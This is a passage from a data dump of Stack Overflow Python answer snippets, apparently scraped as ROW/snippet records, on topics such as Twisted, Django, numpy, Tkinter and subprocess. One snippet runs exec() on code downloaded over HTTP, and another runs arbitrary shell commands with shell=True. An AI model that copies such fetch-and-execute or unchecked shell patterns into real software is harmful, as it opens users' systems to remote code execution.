"The day when earth stood still","Michael Rennie,the strong man","robert wise","1951"
"the gladiator","russel the awesome crowe","ridley scott","2000"
</snippet></ROW><ROW><id>12010914</id><snippet>for i, e in enumerate(L):
    print(e, L[i-1], L[(i+1) % len(L)])
</snippet></ROW><ROW><id>12011486</id><snippet>#import usertest
#import configtest # first test
import unittest   # second test

class ConfigTestCase(unittest.TestCase):
    def setUp(self):
    print 'stp'
        ##set up code

    def runTest(self):

        #runs test
    print 'stp'

def suite():
    """
        Gather all the tests from this module in a test suite.
    """
    test_suite = unittest.TestSuite()
    test_suite.addTest(unittest.makeSuite(ConfigTestCase))
    return test_suite

mySuit=suite()


runner=unittest.TextTestRunner()
runner.run(mySuit)
</snippet></ROW><ROW><id>12012237</id><snippet>&gt;&gt;&gt; soup = bs4.BeautifulSoup(test, "lxml")
&gt;&gt;&gt; [[x for x in row.findAll('td')] for row in soup.findAll('tr')]
[[&lt;td&gt;1&lt;/td&gt;, &lt;td&gt;2&lt;/td&gt;, &lt;td&gt;3&lt;/td&gt;], [&lt;td&gt;1&lt;/td&gt;, &lt;td&gt;2&lt;/td&gt;, &lt;td&gt;3&lt;/td&gt;]]

&gt;&gt;&gt; soup = bs4.BeautifulSoup(test, "html5lib")
&gt;&gt;&gt; [[x for x in row.findAll('td')] for row in soup.findAll('tr')]
[[&lt;td&gt;1&lt;/td&gt;, &lt;td&gt;2&lt;/td&gt;, &lt;td&gt;3&lt;/td&gt;], [&lt;td&gt;1&lt;/td&gt;, &lt;td&gt;2&lt;/td&gt;, &lt;td&gt;3&lt;/td&gt;]]
</snippet></ROW><ROW><id>12012265</id><snippet>if(l[6]):
</snippet></ROW><ROW><id>12012265</id><snippet>if len(l) == 7:
</snippet></ROW><ROW><id>12012293</id><snippet>print "Content-Type: text/html\n"

def get_items(item):    
    for item in items:
        print item+'&lt;br /&gt;'

print "&lt;p&gt;"
get_items(foo)
print "&lt;/p&gt;"
</snippet></ROW><ROW><id>12012825</id><snippet>from twisted.internet import endpoints, reactor, protocol

factory = protocol.Factory()
factory.protocol = protocol.Protocol
endpoint = endpoints.TCP4ServerEndpoint(reactor, 8000)
d = endpoint.listen(factory)
def listenFailed(reason):
    reactor.stop()
d.addErrback(listenFailed)

reactor.run()
</snippet></ROW><ROW><id>12012825</id><snippet>reactor.stop</snippet></ROW><ROW><id>12012825</id><snippet>ReactorNotRunning</snippet></ROW><ROW><id>12012825</id><snippet>listen</snippet></ROW><ROW><id>12012825</id><snippet>reactor.run</snippet></ROW><ROW><id>12012825</id><snippet>d.addErrback(listenFailed</snippet></ROW><ROW><id>12012825</id><snippet>listenFailed</snippet></ROW><ROW><id>12012825</id><snippet>from twisted.internet import endpoints, reactor, protocol
from twisted.application.internet import StreamServerEndpointService
from twisted.application.service import Application

application = Application("Some Kind Of Server")

factory = protocol.Factory()
factory.protocol = protocol.Protocol
endpoint = endpoints.TCP4ServerEndpoint(reactor, 8000)

service = StreamServerEndpointService(endpoint, factory)
service.setServiceParent(application)
</snippet></ROW><ROW><id>12012825</id><snippet>twistd</snippet></ROW><ROW><id>12012825</id><snippet>twistd -y thisfile.tac</snippet></ROW><ROW><id>12012825</id><snippet>reactor.callWhenRunning</snippet></ROW><ROW><id>12012825</id><snippet>from twisted.internet import endpoints, reactor, protocol

factory = protocol.Factory()
factory.protocol = protocol.Protocol
endpoint = endpoints.TCP4ServerEndpoint(reactor, 8000)

def listen():
    d = endpoint.listen(factory)
    def listenFailed(reason):
        reactor.stop()
    d.addErrback(listenFailed)

reactor.callWhenRunning(listen)
reactor.run()
</snippet></ROW><ROW><id>12012841</id><snippet>[app:main]
use = egg:mypackage#myapp
# app config goes here

[server:main]
use = egg:gunicorn#main
# you can put gunicorn config options here
</snippet></ROW><ROW><id>12012841</id><snippet>entry_points={
    'paste.app_factory': [
        'myapp = mypackage.module:app_factory'
    ]
</snippet></ROW><ROW><id>12012841</id><snippet>def app_factory(global_config, **config):
    # initialization code / gevent monkey patch goes here
    # also you can assemble your wsgi stack.
    # then return your flask app
    return app
</snippet></ROW><ROW><id>12012841</id><snippet>gunicorn_paster my_app.ini
</snippet></ROW><ROW><id>12012916</id><snippet>setUp()</snippet></ROW><ROW><id>12012916</id><snippet>tearDown()</snippet></ROW><ROW><id>12012916</id><snippet>setUpClass()</snippet></ROW><ROW><id>12012916</id><snippet>tearDownClass()</snippet></ROW><ROW><id>12012916</id><snippet>WebDriver</snippet></ROW><ROW><id>12013023</id><snippet>pdf_contents = open(os.path.join(os.path.dirname(__file__), 'yourpdf.pdf')).read()
</snippet></ROW><ROW><id>12013023</id><snippet>attachments = [('yourpdf.pdf', pdf_contents)]
</snippet></ROW><ROW><id>12013083</id><snippet>&gt;&gt; import yaml
&gt;&gt; yaml.load('string: 01', Loader=yaml.loader.BaseLoader)
{u'string': u'01'}
</snippet></ROW><ROW><id>12013088</id><snippet>from itertools import product, repeat
given = [1, 2]
with_nones = zip(given, repeat(None))
print(list(product(*with_nones)))
</snippet></ROW><ROW><id>12013107</id><snippet>doc = LH.fromstring(html)
for td in doc.xpath('//td[not(*)]/text()'):
    print td
</snippet></ROW><ROW><id>12013253</id><snippet>views.py</snippet></ROW><ROW><id>12013253</id><snippet>models.py</snippet></ROW><ROW><id>12013253</id><snippet>post_save</snippet></ROW><ROW><id>12013253</id><snippet>created = False

    #Workaround to signal being emitted twice on create and save
    if 'created' in kwargs:
        if kwargs['created']:
            created=True

    #If signal is from object creation, return
    if created:
        return
</snippet></ROW><ROW><id>12013253</id><snippet>post_save</snippet></ROW><ROW><id>12013253</id><snippet>.create(...)</snippet></ROW><ROW><id>12013253</id><snippet>__init__(...)</snippet></ROW><ROW><id>12013253</id><snippet>.save()</snippet></ROW><ROW><id>12013253</id><snippet>dispatch_uid</snippet></ROW><ROW><id>12013363</id><snippet>COUNTRIES</snippet></ROW><ROW><id>12013363</id><snippet>countries_only = [x[1] for x in COUNTRIES]
tags = Tag.objects.filter(tag.name__in=countries_only)
results = {}
for t in tags:
   results[t.name] = t.name.title()
</snippet></ROW><ROW><id>12013394</id><snippet>1. Ken login through Site A.
2. As soon as he hits "login", he's redirected to login to Site B and C through iframe login (submit the auth login requests through HTTPS).

3. The iframe login will return cookies of the site trying to login
     - site B
     - site C
4. Since Ken is not a user of Site C, there is no cookies return from Site C.
5. After two iframe logins, you are back to Site A and at this moment, as authenticated user of Site A, ken has at most two cookies:
    - site A
    - site B
</snippet></ROW><ROW><id>12013407</id><snippet>from pypackage1 import code

code.main()
</snippet></ROW><ROW><id>12013586</id><snippet>MyProject/
   |
   |
   |\ src/
   |   |
   |   |\ mypackage_1/
   |   |\ mypackage_2/
   |   |\ mymodule_1.py
   |    \ mymodule_2.py
   |
   |\ bin/
   |   |
   |   |\ my_script_1.py
   |    \ my_script_2.py
   |
   |\ doc/
   |   |
   |   |\ documentation_for_package_1/
   |   |\ documentation_for_package_2/
   |   |\ documentation_for_modules/
   |    \ documentation_for_scripts
   |
   |
    \ tests/
        |
        |\ tests_for_mypackage_1/
        |\ tests_for_mypackage_2/
        |\ tests_for_mymodule_1
        |\ tests_for_mymodule_2
         \ tests_for_scripts/
</snippet></ROW><ROW><id>12013711</id><snippet>shlex.split()</snippet></ROW><ROW><id>12013711</id><snippet>import shlex

cmdln_args = ('-t 500 -x -c 3 -d --long-option 456 '
              '-testing "weird -behaviour" -m "--inside"')

args = shlex.split(cmdln_args)
options = {k: True if v.startswith('-') else v
           for k,v in zip(args, args[1:]+["--"]) if k.startswith('-')}

from pprint import pprint
pprint(options)
</snippet></ROW><ROW><id>12013711</id><snippet>{'--inside': True,
 '--long-option': '456',
 '-c': '3',
 '-d': True,
 '-m': True,
 '-t': '500',
 '-testing': 'weird -behaviour',
 '-x': True}
</snippet></ROW><ROW><id>12013719</id><snippet>c_ubyte * 6</snippet></ROW><ROW><id>12013719</id><snippet>*args</snippet></ROW><ROW><id>12013719</id><snippet>from c_types import c_ubyte

mac = 'aa:bb:cc:dd:ee:ff'
j = tuple(int(z,16) for z in mac.split(':'))

converted = (c_ubyte * 6)(*j)  # *j here is the most signigicant part
print converted
</snippet></ROW><ROW><id>12013719</id><snippet>&lt;__main__.c_ubyte_Array_6 object at 0x018BD300&gt;
</snippet></ROW><ROW><id>12013754</id><snippet>process_response</snippet></ROW><ROW><id>12013955</id><snippet>ast.parse</snippet></ROW><ROW><id>12013955</id><snippet>import ast
call_names = [c.func.id for c in ast.walk(ast.parse(inspect.getsource(source)))
              if isinstance(x, ast.Call)]
return 'target' in call_names
</snippet></ROW><ROW><id>12013955</id><snippet>import dis
def ops(code):
    i, n = 0, len(code)
    while i &lt; n:
        op = ord(code[i])
        i += 1
        if op == dis.EXTENDED_ARG:
            ext = ord(code[i]) + ord(code[i+1])*256
            op = ord(code[i + 2])
            i += 3
        else:
            ext = 0
        if op &gt;= dis.HAVE_ARGUMENT:
            arg = ord(code[i]) + ord(code[i+1])*256 + ext*65536
            i += 2
            yield op, arg
        else:
            yield op, None

source_ops = list(ops(source.func_code.co_code))
</snippet></ROW><ROW><id>12013955</id><snippet>map</snippet></ROW><ROW><id>12013955</id><snippet>reduce</snippet></ROW><ROW><id>12013955</id><snippet>source.func_code.co_names</snippet></ROW><ROW><id>12013955</id><snippet>'target' in source.func_code.co_names
</snippet></ROW><ROW><id>12013995</id><snippet>db-instance</snippet></ROW><ROW><id>12014022</id><snippet>from datetime import datetime
import time

while True:
    now = datetime.now()
    if now.hour == 7 and now.minute == 15:
        foo()
    time.sleep(10)
</snippet></ROW><ROW><id>12014022</id><snippet>foo()</snippet></ROW><ROW><id>12014071</id><snippet>copy.copy(graph)</snippet></ROW><ROW><id>12014071</id><snippet>copy.deepcopy(manager)</snippet></ROW><ROW><id>12014071</id><snippet>manager.graphs</snippet></ROW><ROW><id>12014071</id><snippet>copy</snippet></ROW><ROW><id>12014379</id><snippet>from Tkinter import * # Tkinter -&gt; tkinter in Python 3

root = Tk()

def hello():
    print "hello!"

# create a popup menu
menu = Menu(root, tearoff=0)
menu.add_command(label="Undo", command=hello)
menu.add_command(label="Redo", command=hello)

# create a frame
frame = Frame(root, width=512, height=512)
frame.pack()

def popup(event):
    menu.post(event.x_root, event.y_root)

# attach popup to frame
frame.bind("&lt;Button-3&gt;", popup)

root.mainloop()
</snippet></ROW><ROW><id>12014379</id><snippet>import Tkinter as tki # Tkinter -&gt; tkinter in Python 3

class GUI(tki.Tk):
    def __init__(self):
        tki.Tk.__init__(self)

        # create a popup menu
        self.aMenu = tki.Menu(self, tearoff=0)
        self.aMenu.add_command(label="Undo", command=self.hello)
        self.aMenu.add_command(label="Redo", command=self.hello)

        # create a frame
        self.aFrame = tki.Frame(self, width=512, height=512)
        self.aFrame.pack()

        # attach popup to frame
        self.aFrame.bind("&lt;Button-3&gt;", self.popup)

    def hello(self):
        print "hello!"

    def popup(self, event):
        self.aMenu.post(event.x_root, event.y_root)

gui = GUI()
gui.mainloop()
</snippet></ROW><ROW><id>12014388</id><snippet>lut</snippet></ROW><ROW><id>12014388</id><snippet>np.arange(4)</snippet></ROW><ROW><id>12014388</id><snippet>swapped_lut = np.rollaxis(lut, -1)
cmyk = swapped_lut[:, rgb[0], rgb[1], rgb[2]].copy()
</snippet></ROW><ROW><id>12014388</id><snippet>cmyk = lut[rgb[0], rgb[1], rgb[2]]
cmyk = cmyk.swapaxes(2, 1).swapaxes(1, 0).copy()
</snippet></ROW><ROW><id>12014388</id><snippet>cmyk = lut[tuple(rgb)]
cmyk = np.rollaxis(cmyk, -1).copy()
</snippet></ROW><ROW><id>12014388</id><snippet>rng = np.arange(4).reshape(4, 1, 1)
cmyk = lut[rgb[0], rgb[1], rgb[2], rng]
</snippet></ROW><ROW><id>12014511</id><snippet>ONLY [table]</snippet></ROW><ROW><id>12014511</id><snippet>ONLY</snippet></ROW><ROW><id>12014511</id><snippet>result = table.select().with_hint(table, 'ONLY', 'postgresql')
</snippet></ROW><ROW><id>12014579</id><snippet>a = '\xb5g'
# '\xb5g'
print a
# ?g

b = a.decode('latin-1')
print b
# µg

b
# u'\xb5g'
</snippet></ROW><ROW><id>12014579</id><snippet>MySQLdb.connect(..., use_unicode=True)
</snippet></ROW><ROW><id>12014625</id><snippet>import types

class copyattributes(object):
    def __init__(self, source):
        self.source = source

    def __call__(self, target):
        for attr, value in self.source.__dict__.items():
            if attr.startswith('__'):
                continue
            if isinstance(value, (property, types.FunctionType)):
                continue
            setattr(target, attr, value)
        return target
</snippet></ROW><ROW><id>12014625</id><snippet>class A(object):
    x = 0

@copyattributes(A)
class B(object):
    y = 0
</snippet></ROW><ROW><id>12014625</id><snippet>&gt;&gt;&gt; class A(object):
...     x = 0
...
&gt;&gt;&gt; @copyattributes(A)
... class B(object):
...     y = 0
... 
&gt;&gt;&gt; B.y
0
&gt;&gt;&gt; B.x
0
&gt;&gt;&gt; dir(B)
['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'x', 'y']
</snippet></ROW><ROW><id>12014898</id><snippet>n.article_set.all()</snippet></ROW><ROW><id>12014898</id><snippet>prefetch_related</snippet></ROW><ROW><id>12014898</id><snippet>zip</snippet></ROW><ROW><id>12014898</id><snippet>newsletters = Newsletter.objects.prefetch_related('article_set').all()\
                    .order_by('-year', '-number')

return render_to_response('newsletter/newsletter_list.html',
                          {'newsletter_list': newsletters})
</snippet></ROW><ROW><id>12014898</id><snippet>{% block content %}
  {% for newsletter in newsletter_list %}
    &lt;h2&gt;{{ newsletter.label }}&lt;/h2&gt;
    &lt;p&gt;Volume {{ newsletter.volume }}, Number {{ newsletter.number }}&lt;/p&gt;
    &lt;p&gt;{{ newsletter.article }}&lt;/p&gt;
    &lt;ul&gt;
    {% for a in newsletter.article_set.all %}
      &lt;li&gt;{{ a.title }}&lt;/li&gt;
    {% endfor %}
    &lt;/ul&gt;
  {% endfor %}
{% endblock %}
</snippet></ROW><ROW><id>12015081</id><snippet>.overrideredirect(1)</snippet></ROW><ROW><id>12015081</id><snippet>.overrideredirect(1)</snippet></ROW><ROW><id>12015245</id><snippet>&gt;&gt;&gt; import dateutil.tz
&gt;&gt;&gt; import datetime
&gt;&gt;&gt; localtz = dateutil.tz.tzlocal()
&gt;&gt;&gt; localtz.tzname(datetime.datetime.now())
'EDT'
</snippet></ROW><ROW><id>12015245</id><snippet>&gt;&gt;&gt; localtz.tzname(datetime.datetime.now() + datetime.timedelta(weeks=20))
'EST'
</snippet></ROW><ROW><id>12015245</id><snippet>&gt;&gt;&gt; localtz.utcoffset(datetime.datetime.now())
datetime.timedelta(-1, 72000)
</snippet></ROW><ROW><id>12015245</id><snippet>&gt;&gt;&gt; localoffset = localtz.utcoffset(datetime.datetime.now())
&gt;&gt;&gt; (localoffset.days * 86400 + localoffset.seconds) / 3600
-4
</snippet></ROW><ROW><id>12015344</id><snippet>urls.py</snippet></ROW><ROW><id>12015344</id><snippet>(r'^registration/check/([\w|\W]+)/$', register_check),
</snippet></ROW><ROW><id>12015344</id><snippet>(r'^registration/check/([\w|\W]+)/$', "register_check"),
</snippet></ROW><ROW><id>12015400</id><snippet>for row in rows:
    name=row[0].upper().decode('utf8') # or whatever...you DO need to know the encoding.
</snippet></ROW><ROW><id>12015400</id><snippet>remove_accents</snippet></ROW><ROW><id>12015400</id><snippet>def remove_accents(input_str):
    nkfd_form = unicodedata.normalize('NFKD', input_str)
    return u''.join(c for c in nkfd_form if not unicodedata.combining(c))
</snippet></ROW><ROW><id>12015412</id><snippet>subprocess</snippet></ROW><ROW><id>12015412</id><snippet>check_output</snippet></ROW><ROW><id>12015412</id><snippet>&gt;&gt;&gt; subprocess.check_output(["echo", "Hello World!"])
'Hello World!\n'

&gt;&gt;&gt; subprocess.check_output("exit 1", shell=True)
Traceback (most recent call last):
   ...
subprocess.CalledProcessError: Command 'exit 1' returned non-zero exit status 1
</snippet></ROW><ROW><id>12015514</id><snippet>schedule</snippet></ROW><ROW><id>12015514</id><snippet>app = webapp2.WSGIApplication([
        ('/', MainPage), 
        ('/create/([\w]+)', CreateCourt), 
        ('/createlocation/([\w]+)', CreateLocation), 
        ('/schedule/([\w]+)/([\w]+)', Schedule) 
        ],
        debug=True)
</snippet></ROW><ROW><id>12015515</id><snippet>numpy.save</snippet></ROW><ROW><id>12015515</id><snippet>numpy.savez</snippet></ROW><ROW><id>12015515</id><snippet>numpy.load</snippet></ROW><ROW><id>12015515</id><snippet>import numpy as np
xs = np.linspace(-3, 5, 800)
ys = np.linspace(-3, 5, 800)
f_vals = np.random.normal(size=(xs.size, ys.size))
np.savez('the_file.npz', xs=xs, ys=ys, f=f_vals)
</snippet></ROW><ROW><id>12015557</id><snippet>import ssl
ssl.get_server_certificate(("www.sefaz.ce.gov.br",443)) 
</snippet></ROW><ROW><id>12015557</id><snippet>"""Retrieve the certificate from the server at the specified address,
   and return it as a PEM-encoded string.
   If 'ca_certs' is specified, validate the server cert against it.
   If 'ssl_version' is specified, use it in the connection attempt."""
</snippet></ROW><ROW><id>12015557</id><snippet>def get_commonname(host,port=443):
    oid='\x06\x03U\x04\x03' # Object Identifier 2.5.4.3 (COMMON NAME)
    pem=ssl.get_server_certificate((host,port))
    der=ssl.PEM_cert_to_DER_cert(pem)
    i=der.find(oid) # find first common name (certificate authority)
    if i!=-1:
        i=der.find(oid,i+1) # skip and find second common name
        if i!=-1:
            begin=i+len(oid)+2
            end=begin+ord(der[begin-1])
            return der[begin:end]
    return None
</snippet></ROW><ROW><id>12015857</id><snippet>def shell(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except Exception, e:
        output = str(e.output)
    finished = output.split('\n')
    for line in finished:
        print line
    return
</snippet></ROW><ROW><id>12015932</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>12015932</id><snippet>python</snippet></ROW><ROW><id>12015932</id><snippet>python</snippet></ROW><ROW><id>12015932</id><snippet>/usr/bin</snippet></ROW><ROW><id>12015932</id><snippet>/Library/Frameworks</snippet></ROW><ROW><id>12015932</id><snippet>/usr/local/bin</snippet></ROW><ROW><id>12015932</id><snippet>bin</snippet></ROW><ROW><id>12015932</id><snippet>/Library/Frameworks/Python.framework/Versions/2.7/bin</snippet></ROW><ROW><id>12015932</id><snippet>$PATH</snippet></ROW><ROW><id>12015932</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>12015932</id><snippet>site-library</snippet></ROW><ROW><id>12015932</id><snippet>site-library</snippet></ROW><ROW><id>12015932</id><snippet>PEAK</snippet></ROW><ROW><id>12015932</id><snippet>PEAK-rules</snippet></ROW><ROW><id>12015932</id><snippet>umask 022
sudo /usr/bin/easy_install-2.7 -m peak     # "uninstall" peak if installed
sudo /usr/bin/easy_install-2.7 peak-rules  # install peak-rules
</snippet></ROW><ROW><id>12015932</id><snippet>easy_install</snippet></ROW><ROW><id>12015932</id><snippet>PyPI distribute</snippet></ROW><ROW><id>12015932</id><snippet>pip</snippet></ROW><ROW><id>12016017</id><snippet>def update_settings(request):
    if request.method== 'POST':
        try:
            u = UserProfile.objects.get(user=request.user)
            form = UserProfileForm(request.POST, instance=u)
        except ObjectDoesNotExist:
            form = UserProfileForm(request.POST, request.FILES)
        if form.is_valid():  #is_valid is function not property
            profile = form.save(commit=False)
            profile.user = request.user
            profile.save()
            return HttpResponseRedirect('registration/activation_complete.html')
    else:
        try:
            u = UserProfile.objects.get(user=request.user)
            form = UserProfileForm(instance=u) #No request.POST
        except ObjectDoesNotExist:
            form = UserProfileForm(request.FILES)
   # move it outside of else
   return render_to_response('registration/update_settings.html', locals(),
                 context_instance=RequestContext(request))
</snippet></ROW><ROW><id>12016031</id><snippet>[c + '\0' for c in S]
</snippet></ROW><ROW><id>12016031</id><snippet>u'teststring'.encode('utf-16le')
</snippet></ROW><ROW><id>12016079</id><snippet>|</snippet></ROW><ROW><id>12016079</id><snippet>import re

p = re.compile('(?P&lt;name&gt;[^|]*)\|(?P&lt;desc&gt;[^|]*)')
m = p.match('jack|a good boy')
name = m.group('name')
desc = m.group('desc')
print name  # jack
print desc  # a good boy
</snippet></ROW><ROW><id>12016079</id><snippet>|</snippet></ROW><ROW><id>12016079</id><snippet>\|</snippet></ROW><ROW><id>12016117</id><snippet>blobstore.create_upload_url('/upload')</snippet></ROW><ROW><id>12016117</id><snippet>/upload</snippet></ROW><ROW><id>12016118</id><snippet>datetime</snippet></ROW><ROW><id>12016160</id><snippet>&gt;&gt;&gt; exec(urllib2.urlopen('http://www.ics.uci.edu/~eppstein/PADS/UnionFind.py').read())
&gt;&gt;&gt; uf = UnionFind()
</snippet></ROW><ROW><id>12016160</id><snippet>wget</snippet></ROW><ROW><id>12016160</id><snippet>curl</snippet></ROW><ROW><id>12016160</id><snippet>$ wget http://www.ics.uci.edu/~eppstein/PADS/UnionFind.py

&gt;&gt;&gt; from UnionFind import UnoinFind
&gt;&gt;&gt; uf = UnionFind()
</snippet></ROW><ROW><id>12016247</id><snippet>#---------------------------------------------------------79th-column-mark---&gt;|
cmd_folder = os.path.realpath(
    os.path.abspath(os.path.split(inspect.getfile(inspect.currentframe()))[0]))
</snippet></ROW><ROW><id>12016261</id><snippet>G.label(*x)
</snippet></ROW><ROW><id>12016403</id><snippet>if key in collection:
</snippet></ROW><ROW><id>12016403</id><snippet>.get</snippet></ROW><ROW><id>12016403</id><snippet>if collection.get(key, None):
</snippet></ROW><ROW><id>12016403</id><snippet>__missing__</snippet></ROW><ROW><id>12016403</id><snippet>class collection(dict):

    def __missing__(self, key):
        print "Too bad, {key} does not exist".format(key=key)
        return None


d = collection()
d[1] = 'one'

print d[1]

if d[2]:
    print "Found it"
</snippet></ROW><ROW><id>12016403</id><snippet>one
Too bad, 2 does not exist
</snippet></ROW><ROW><id>12016610</id><snippet>&gt;&gt;&gt; list(map(lambda *a: a,*zip(*itertools.zip_longest(range(5),range(10,17)))))
[(0, 10), (1, 11), (2, 12), (3, 13), (4, 14), (None, 15), (None, 16)]
</snippet></ROW><ROW><id>12016610</id><snippet>&gt;&gt;&gt; def oldMapNone(*ells):
...     '''replace for map(None, ....), invalid in 3.0 :-( '''
...     lgst = max([len(e) for e in ells])
...     return list(zip(* [list(e) + [None] * (lgst - len(e)) for e in ells]))
... 
&gt;&gt;&gt; oldMapNone(range(5),range(10,12),range(30,38))
[(0, 10, 30), (1, 11, 31), (2, None, 32), (3, None, 33), (4, None, 34), (None, None, 35), (None, None, 36), (None, None, 37)]
</snippet></ROW><ROW><id>12017030</id><snippet># tty reader

def listen_to_device():
    with open('/dev/ttyXX', 'r') as tty:
        for line in tty:
            create_db_record(line)

if __name__ == '__main__':
    listen_to_device()
</snippet></ROW><ROW><id>12017030</id><snippet># tty controller

import os
import shutil
import time

def wait_for_commands():
    while True:
        if os.path.exists('/tmp/commands.txt'):
            with open('/tmp/commands.txt', 'r') as c:
                for command in c:
                    send_command(command)
            shutil.move('/tmp/commands.txt', 'tmp/proccesed-' str(datetime.utcnow()))
        time.sleep(1)


def send_command(command):
    with open('/dev/ttyXX', 'w') as tty:
        # maybe do some additional changes to command here?
        tty.write(command)


if __name__ == '__main__':
    wait_for_command()
</snippet></ROW><ROW><id>12017408</id><snippet>for line in open('C:\Users\me\Desktop\URLS-HERE.txt'):
   if line.startswith('http') and line.endswith('html\n') :
      fichier = open("C:\Users\me\Desktop\other.txt", "a")
      allhtml = urllib.urlopen(line)
      fichier.write(allhtml.read())
      fichier.close()
</snippet></ROW><ROW><id>12017899</id><snippet>import parser
</snippet></ROW><ROW><id>12018360</id><snippet>Reply-To</snippet></ROW><ROW><id>12018360</id><snippet>email = EmailMessage(
            subject='Registration Successful',
            body=msg,
            from_email='My Name &lt;me@gmail.com&gt;',
            to='recipient@gmail.com',
            headers={'Reply-To': 'another@gmail.com'})
email.send()
</snippet></ROW><ROW><id>12018847</id><snippet>while gtk.events_pending ():
    gtk.main_iteration ()
</snippet></ROW><ROW><id>12018928</id><snippet>.values()</snippet></ROW><ROW><id>12018928</id><snippet>ValuesQuerySet</snippet></ROW><ROW><id>12018928</id><snippet>album_image_list</snippet></ROW><ROW><id>12018928</id><snippet>json.dumps(list(album_image_list), cls=DjangoJSONEncoder)
</snippet></ROW><ROW><id>12018980</id><snippet>Test</snippet></ROW><ROW><id>12018980</id><snippet>Subclass</snippet></ROW><ROW><id>12018980</id><snippet>__init__</snippet></ROW><ROW><id>12018980</id><snippet>class Test(object):         
    item = 0                # self['item'] = 0

    def __init__(self):
        print(self.item)    # print(self['item'])

    def test(self):
        print(self.item)    # print(self['item'])

class Subclass(Test):       
    item = 1                # self['item'] = 1

s = Subclass()              # Test.__init__({})
s.test()                    
</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>Subclass</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>Test</snippet></ROW><ROW><id>12018980</id><snippet>int item</snippet></ROW><ROW><id>12018980</id><snippet>Test</snippet></ROW><ROW><id>12018980</id><snippet>Subclass</snippet></ROW><ROW><id>12018980</id><snippet>int item</snippet></ROW><ROW><id>12018980</id><snippet>Subclass</snippet></ROW><ROW><id>12018980</id><snippet>public class Test {

    private int item;

    public Test() {
        this(0); // Default to 0
    }

    public Test(int item) {
        setItem(item);
        test();
    }

    public void test() {
        System.out.println(getItem());
    }

    public static void main(String[] args) {
        Subclass s = new Subclass();
        s.test();
    }

    public void setItem(int item) {
        this.item = item;
    }    

    public int getItem() {
        return item;
    }

}

class Subclass extends Test {

  public Subclass() {
      super(1); // Default to 1
  }

}
</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>private</snippet></ROW><ROW><id>12018980</id><snippet>public class Test {
   // Same as above . . .
}

class Subclass extends Test {

  private int subclassItem = 1;

  public int getItem() {
    return subclassItem;
  }

  public void setItem(int item) {
    this.subclassItem = item;
  }

}
</snippet></ROW><ROW><id>12018980</id><snippet>item</snippet></ROW><ROW><id>12018980</id><snippet>0 1</snippet></ROW><ROW><id>12018980</id><snippet>1 1</snippet></ROW><ROW><id>12018980</id><snippet>this</snippet></ROW><ROW><id>12019007</id><snippet>(1)  print "First number is {} and second number is {}".format(first, second)
(1b) print "First number is {first} and number is {second}".format(first=first, second=second) 
</snippet></ROW><ROW><id>12019007</id><snippet>(2) print 'First number is', first, ' second number is', second
</snippet></ROW><ROW><id>12019007</id><snippet>(3) print 'First number %d and second number is %d' % (first, second)
</snippet></ROW><ROW><id>12019007</id><snippet>(4) print 'First number is' + str(first) + 'second number is' + str(second)
</snippet></ROW><ROW><id>12019114</id><snippet>mongo.mongoengine=true
</snippet></ROW><ROW><id>12019266</id><snippet>self.client_address</snippet></ROW><ROW><id>12019266</id><snippet>self.client_address[0]</snippet></ROW><ROW><id>12019301</id><snippet>cgi.escape</snippet></ROW><ROW><id>12019301</id><snippet>urllib.quote_plus</snippet></ROW><ROW><id>12019301</id><snippet>&gt;&gt;&gt; import cgi
&gt;&gt;&gt; import urllib
&gt;&gt;&gt; s = "This is@A#!T33ST::::;'[]{}"
&gt;&gt;&gt; cgi.escape(s)
"This is@A#!T33ST::::;'[]{}"
&gt;&gt;&gt; urllib.quote_plus(s)
'This+is%40A%23%21T33ST%3A%3A%3A%3A%3B%27%5B%5D%7B%7D'
</snippet></ROW><ROW><id>12019301</id><snippet>cgi.escape(s[, quote])</snippet></ROW><ROW><id>12019301</id><snippet>Convert the characters '&amp;', '&lt;' and '&gt;' in string s to HTML-safe sequences. 
Use this if you need to display text that might containsuch characters in HTML.
</snippet></ROW><ROW><id>12019301</id><snippet>&gt;&gt;&gt; urllib.urlopen("http://this-is-an-example.com/thisisadirectory/file.php?f=Hello&amp;v="+urllib.quote_plus("Thi
s is@A#!T33ST::::;'[]{}"))
&lt;addinfourl at 24629656 whose fp = &lt;socket._fileobject object at 0x16ebc30&gt;&gt;
&gt;&gt;&gt; _.read()
'&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;\n&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"\n
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;\n&lt;html xmlns="http://www.w3.org/1999/xhtml
" xml:lang="en" lang="en"&gt;\n &lt;head&gt;\n  &lt;title&gt;404 - Not Found&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n  &lt;h1&gt;404 - Not Foun
d&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n'
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>12019585</id><snippet>**This function does something**</snippet></ROW><ROW><id>12019585</id><snippet>_remove_oneline</snippet></ROW><ROW><id>12019630</id><snippet>.drop_all()</snippet></ROW><ROW><id>12019630</id><snippet>session.commit()
Base.metadata.drop_all()
</snippet></ROW><ROW><id>12019630</id><snippet>DROP TABLE</snippet></ROW><ROW><id>12019630</id><snippet>isolation_level</snippet></ROW><ROW><id>12019630</id><snippet>create_engine()</snippet></ROW><ROW><id>12019630</id><snippet>engine = create_engine(
    'mysql://username:passwd@localhost/databasename',
    isolation_level='READ UNCOMMITTED')
</snippet></ROW><ROW><id>12019630</id><snippet>SET TRANSACTION</snippet></ROW><ROW><id>12019708</id><snippet>__init__.py</snippet></ROW><ROW><id>12019855</id><snippet>[n for n, (i, s) in enumerate(t) if s == 'str_3']
